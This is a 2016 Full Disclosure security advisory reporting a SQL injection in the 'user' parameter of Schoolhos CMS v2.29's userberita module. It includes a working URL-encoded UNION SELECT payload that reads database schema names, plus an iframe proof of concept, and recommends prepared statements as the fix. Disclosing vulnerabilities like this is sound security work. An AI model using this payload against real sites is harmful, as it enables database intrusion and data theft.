
Date: Mon, 28 Nov 2016 12:11:29 +0100
From: Vulnerability Lab <research@...nerability-lab.com>
To: fulldisclosure@...lists.org
Subject: [FD] Schoolhos CMS v2.29 - userberita SQL injection Vulnerability

Document Title:
===============
Schoolhos CMS v2.29 - userberita SQL injection Vulnerability 


References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1932


Release Date:
=============
2016-11-22


Vulnerability Laboratory ID (VL-ID):
====================================
1932


Common Vulnerability Scoring System:
====================================
6.8


Product & Service Introduction:
===============================
Schoolhos CMS is alternative to developing School Website. It's Free and Open Source under GPL License. Easy to install, user friendly and elegant design.

(Copy of the Vendor Homepage: http://www.schoolhos.com/  &  https://sourceforge.net/projects/schoolhoscms/ )


Abstract Advisory Information:
==============================
The vulnerability laboratory core research team discovered a remote sql-injection vulnerability in the official Schoolhos v2_29 content management system.


Vulnerability Disclosure Timeline:
==================================
2016-11-22: Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
Schoolhos
Product: Schoolhos - Content Management System (Web-Application) 2016 Q3


Exploitation Technique:
=======================
Remote


Severity Level:
===============
High


Technical Details & Description:
================================
A remote sql injection web vulnerability has been discovered  in the official Schoolhos v2_29 content management system.
The web vulnerability allows remote attackers to execute own malicious sql commands to compromise the application or dbms. 

The sql injection vulnerability is located in the `user` parameter of the `index?p=userberita` module GET method request. 
Remote attackers are able to execute own sql commands by usage of an insecure GET method request through the vulnerable 
parameter of the own application. The attack vector of the vulnerability is application-side and the request method to 
inject is GET. The security vulnerability in the content management system is a classic select remote sql-injection.

The security risk of the vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 6.8.
Exploitation of the remote sql injection vulnerability requires no user interaction or privileged web-application user account.
Successful exploitation of the remote sql injection results in database management system, web-server and web-application compromise.

Request Method(s):
[+] GET 


Vulnerable Module(s):
[+] userberita 


Vulnerable Parameter(s):
[+] user 


Proof of Concept (PoC):
=======================
The remote sql-injection web vulnerability can be exploited by remote attackers without privileged web-application user account and without user interaction.
For security demonstration or to reproduce the sql-injection web vulnerability follow the provided information and steps below to continue.

PoC: Payload
999999.9%27+union+all+select+0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C%28select+distinct+concat%280x
7e%2C0x27%2Cschema_name%2C0x27%2C0x7e%29+from+%60information_schema%60.schemata+limit+0%2C1%29%2C0x31303235343830303536%2C0x31303235343
830303536%2C0x31303235343830303536%2C0x31303235343830303536+and+%27x%27%3D%27x


PoC: Exploitation
<html>
<head><body>
<title>Schoolhos (userberita) - Remote SQL Injection Vulnerability</title>
<iframe src="http://schoolhos.localhost:8080/versi_2.29/?p=userberita&user=999999.9%27+union+all+select+
0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C%28select+
distinct+concat%280x7e%2C0x27%2Cschema_name%2C0x27%2C0x7e%29+from+%60information_schema%60.schemata+limit+
0%2C1%29%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536+and+%27x%27%3D%27x" width="700" height="700">


Reference(s):
http://schoolhos.localhost:8080/
http://schoolhos.localhost:8080/versi_2.29/
http://schoolhos.localhost:8080/versi_2.29/?p


Solution - Fix & Patch:
=======================
The sql-injection web vulnerability can be patched by usage of a secure prepared statement to perform the queries.
Parse the parameter input and filter the context. Disallow the usage of special chars to prevent further sql-injection attacks.


Security Risk:
==============
The security risk of the sql-injection vulnerability in the schoolhos web-application is estimated as high. (CVSS 6.8)


Credits & Authors:
==================
Vulnerability Laboratory [Research Team] - Lawrence Amer (http://www.vulnerability-lab.com/show.php?user=Lawrence%20Amer)


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability mainly for 
consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, 
deface websites, hack into databases or trade with stolen data.

Domains:    www.vulnerability-lab.com 		- www.vuln-lab.com 						- www.evolution-sec.com
Section:    magazine.vulnerability-lab.com 	- vulnerability-lab.com/contact.php 				- evolution-sec.com/contact
Social:	    twitter.com/vuln_lab		- facebook.com/VulnerabilityLab 				- youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php 	- vulnerability-lab.com/rss/rss_upcoming.php 			- vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php 	- vulnerability-lab.com/list-of-bug-bounty-programs.php 	- vulnerability-lab.com/register.php

Any modified copy or reproduction, including partially usages, of this file, resources or information requires authorization from Vulnerability Laboratory. 
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website is trademark 
of vulnerability-lab team & the specific authors or managers. To record, list, modify, use or edit our material contact (admin@) to get a ask permission.

				    Copyright © 2016 | Vulnerability Laboratory - [Evolution Security GmbH]™



-- 
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com



_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/